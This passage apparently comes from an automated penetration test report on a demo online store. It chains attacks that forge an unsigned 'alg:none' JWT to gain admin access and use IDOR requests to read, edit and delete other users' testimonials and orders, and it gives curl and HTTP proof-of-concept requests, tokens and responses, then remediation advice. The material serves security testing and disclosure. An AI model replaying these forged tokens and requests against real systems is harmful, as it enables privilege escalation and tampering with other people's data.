Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiZjA1MTIwOWYtN2JhOS00NTM0LTk2MDctOGU0Y2VkZThlYWZhIiwidXNlcm5hbWUiOiJ1c2VyYV90ZXN0MiIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc5MDY0NjQwMH0.
```

4. Response: 200 OK with full user list including admin users

5. Also works on /api/v1/users/me/profile (200 OK) and /api/v1/users/ (200 OK)`
  - session → cross_principal_read: With a valid session the attacker can invoke the privileged functions a broken-function-level-authorization flaw fails to gate. — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `# As user_a (role: "user", not admin)
curl "https://duck-store.escape.tech/api/v1/admin/users" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMDBhZDY4ODgtNGJkMC00NjNjLTk5NDgtOTZjZTYzMTgxMTdhIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY0MTQ1N30.Bzar0Ip4LmK5XetHM7ajgvIXLjsmq2qQczleb95_Md0"

# Response includes ALL users including admins:
# [{"username":"admin","email":"admin@duck-store.escape","id":"550e8400-e29b-41d4-a716-446655440000","role":"admin",...},
#  {"username":"escape_scanner_priv","email":"escape.security.priv@email.com","id":"6ba7b817-9dad-11d1-80b4-00c04fd430c8","role":"admin",...},
#  ... all other users ...]

# user_a's JWT payload shows role: "user" not "admin"`
- Chain: session → cross_principal_read
  - session — POST https://duck-store.escape.tech/api/v1/auth/login (JWT validation on all protected endpoints) · PoC: `1. Original user_a token (HS256): eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiZjA1MTIwOWYtN2JhOS00NTM0LTk2MDctOGU0Y2VkZThlYWZhIiwidXNlcm5hbWUiOiJ1c2VyYV90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDAwfQ.jjm1FNMyQsfAxt3FEemcaRAUeX9QpHRpTSpgz3afX-I

2. Forged token with alg=none and role=admin: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiZjA1MTIwOWYtN2JhOS00NTM0LTk2MDctOGU0Y2VkZThlYWZhIiwidXNlcm5hbWUiOiJ1c2VyYV90ZXN0MiIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc5MDY0NjQwMH0.

3. Request with forged token:
```
GET /api/v1/admin/users HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiZjA1MTIwOWYtN2JhOS00NTM0LTk2MDctOGU0Y2VkZThlYWZhIiwidXNlcm5hbWUiOiJ1c2VyYV90ZXN0MiIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc5MDY0NjQwMH0.
```

4. Response: 200 OK with full user list including admin users

5. Also works on /api/v1/users/me/profile (200 OK) and /api/v1/users/ (200 OK)`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — PUT/DELETE/GET https://duck-store.escape.tech/api/v1/testimonials/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create a testimonial (ID 18)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's testimonial via IDOR:
```
GET /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 200 OK with user_a's testimonial data

4. MODIFY user_a's testimonial as user_b:
```
PUT /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
Content-Type: application/json

{"content": "Updated by user_a", "rating": 1}
```
Response: 200 OK - testimonial successfully modified

5. DELETE user_a's testimonial as user_b:
```
DELETE /api/v1/testimonials/18 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```
Response: 204 No Content - testimonial successfully deleted`
- Chain: session → cross_principal_read
  - session — POST https://duck-store.escape.tech/api/v1/auth/login (JWT validation on all protected endpoints) · PoC: `1. Original user_a token (HS256): eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiZjA1MTIwOWYtN2JhOS00NTM0LTk2MDctOGU0Y2VkZThlYWZhIiwidXNlcm5hbWUiOiJ1c2VyYV90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDAwfQ.jjm1FNMyQsfAxt3FEemcaRAUeX9QpHRpTSpgz3afX-I

2. Forged token with alg=none and role=admin: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiZjA1MTIwOWYtN2JhOS00NTM0LTk2MDctOGU0Y2VkZThlYWZhIiwidXNlcm5hbWUiOiJ1c2VyYV90ZXN0MiIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc5MDY0NjQwMH0.

3. Request with forged token:
```
GET /api/v1/admin/users HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiZjA1MTIwOWYtN2JhOS00NTM0LTk2MDctOGU0Y2VkZThlYWZhIiwidXNlcm5hbWUiOiJ1c2VyYV90ZXN0MiIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc5MDY0NjQwMH0.
```

4. Response: 200 OK with full user list including admin users

5. Also works on /api/v1/users/me/profile (200 OK) and /api/v1/users/ (200 OK)`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/orders/{id} · PoC: `1. Authenticate as user_a (usera_test2) and create an order (ID 9)
2. Authenticate as user_b (userb_test2) with token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs

3. Access user_a's order via IDOR:
```
GET /api/v1/orders/9 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNGI3ZGUyYjAtZGY5ZS00ODI5LTg5OTQtYTkyYmU0MzBkYmEyIiwidXNlcm5hbWUiOiJ1c2VyYl90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDEzfQ.KOnyrbtgKgrKsV-OdFw2pLS4HVZtm5LymUFbDPYz3vs
```

4. Response: 200 OK with user_a's order details:
```json
{"id":9,"user_id":"f051209f-7ba9-4534-9607-8e4cede8eafa","total_price":35.96,"status":"processing","items":[{"product_id":1,"quantity":3,"price":9.99,"id":16,"product":{"name":"Classic Yellow Duck","description":"The timeless classic rubber duck that started it all!","price":9.99,"stock":82,"color":"Yellow","material":"Rubber","size":"Medium","image_url":"/static/products/classic-duck.png","id":1,"created_at":"2026-09-28T23:39:05.241260"}}],"created_at":"2026-09-29T01:33:53.528773","shipping_first_name":"Test","shipping_last_name":"User","shipping_address":"123 Test St","shipping_city":"Test City","shipping_zip_code":"12345","shipping_country":"US"}
```

5. PUT/DELETE on the same endpoint returned 405 Method Not Allowed (read-only IDOR)`
- Chain: session → cross_principal_read
  - session — POST https://duck-store.escape.tech/api/v1/auth/login (JWT validation on all protected endpoints) · PoC: `1. Original user_a token (HS256): eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiZjA1MTIwOWYtN2JhOS00NTM0LTk2MDctOGU0Y2VkZThlYWZhIiwidXNlcm5hbWUiOiJ1c2VyYV90ZXN0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwNjQ2NDAwfQ.jjm1FNMyQsfAxt3FEemcaRAUeX9QpHRpTSpgz3afX-I

2. Forged token with alg=none and role=admin: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiZjA1MTIwOWYtN2JhOS00NTM0LTk2MDctOGU0Y2VkZThlYWZhIiwidXNlcm5hbWUiOiJ1c2VyYV90ZXN0MiIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc5MDY0NjQwMH0.

3. Request with forged token:
```
GET /api/v1/admin/users HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiZjA1MTIwOWYtN2JhOS00NTM0LTk2MDctOGU0Y2VkZThlYWZhIiwidXNlcm5hbWUiOiJ1c2VyYV90ZXN0MiIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc5MDY0NjQwMH0.
```

4. Response: 200 OK with full user list including admin users

5. Also works on /api/v1/users/me/profile (200 OK) and /api/v1/users/ (200 OK)`
  - session → cross_principal_read: A live session is the authenticated context an IDOR uses to request objects belonging to other principals. — GET https://duck-store.escape.tech/api/v1/admin/users · PoC: `Request with regular user token (testuser1, role: user):
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYjkwYTE5YjMtNzJkZi00NDhlLWI0MmUtY2EwZDU1MjMzOGU1IiwidXNlcm5hbWUiOiJ0ZXN0dXNlcjEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY3MDA5NH0.1Nhl4KX6PqDVgb8Z9mEKttzDWyLU15fPS-lKAV2vBYc" https://duck-store.escape.tech/api/v1/admin/users

Response: HTTP 200 with full user list including admin user:
[{"username":"admin","email":"admin@duck-store.escape","id":"550e8400-e29b-41d4-a716-446655440000","created_at":"2026-09-29T07:39:20.400122","role":"admin","first_name":"Admin","last_name":"Duck","avatar_url":"/static/avatars/sarah.png","bio":"Store Administrator","account_credit":0.0,"referral_count":0,"totp_enabled":false,"can_be_deleted":false}, ...]`

## Remediation (grouped by root cause)
- **rate_limit** (13)
- **auth_bypass** (8)
- **idor_bola** (3) — 1. Implement proper object-level authorization checks on all testimonial endpoints
2. Ensure users can only modify/delete their own testimonials (validate testimonial.user_id matches authenticated user)
3. Use middleware or decorators to validate ownership before allowing write operations
4. Apply the same authorization checks to GET endpoints if testimonials contain sensitive data
- **sqli** (2) — Use parameterized queries/prepared statements for all database interactions. Never concatenate user input directly into SQL queries. Implement proper input validation and sanitization. Consider using an ORM with built-in SQL injection protection.
- **ssrf** (2) — Implement strict URL validation: allowlist allowed domains/schemes (HTTPS only), block private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16, 127.0.0.0/8), block localhost, and enforce a timeout. Use a dedicated HTTP client that does not follow redirects to internal addresses.
- **jwt_flaws** (1) — Implement strict JWT algorithm validation. Only accept tokens signed with the expected algorithm (HS256/RS256). Reject tokens with "alg": "none" or any algorithm not explicitly configured. Use a JWT library that enforces algorithm validation by default.
- **mass_assignment** (1) — Implement allow-lists for updatable fields in profile endpoints. Use DTOs/serializers that only expose intended fields. Add authorization checks before accepting role/privilege changes. Never trust client-sent role or admin fields.
- **xxe** (1) — Disable external entity processing in the XML parser. For Java: set `DocumentBuilderFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` and `setFeature("http://xml.org/sax/features/external-general-entities", false)`. For Python lxml: use `etree.XMLParser(resolve_entities=False)`. Implement input validation to reject XML/SVG content in non-XML endpoints.
- **bfla** (1) — Implement proper role-based access control (RBAC) on all administrative endpoints. Verify user role/permissions before allowing access to admin functions.
- **price_tamper** (1) — Validate quantity parameter to ensure it's a positive integer. Reject negative or zero quantities. Implement server-side price calculation that cannot be overridden by client input.
- **excessive_data** (1) — Implement proper authorization checks on /api/v1/users/ endpoint. Regular users should not be able to list all users. Consider implementing pagination, rate limiting, and restricting this endpoint to admin users only.
- **webhook** (1) — Provide a valid integrity attribute to the tag.
- **security_headers** (1)

## Consolidated related reports
- **JWT Algorithm Confusion - "alg:none" Accepted Allowing Token Forgery and Privilege Escalation** — consolidated 2 related report(s):
  - JWT Algorithm Confusion: alg=none Accepted - Full Authentication Bypass (same-root cluster)
  - JWT Algorithm Confusion: "none" Algorithm Accepted - Full Authentication Bypass to Admin (same-root cluster)
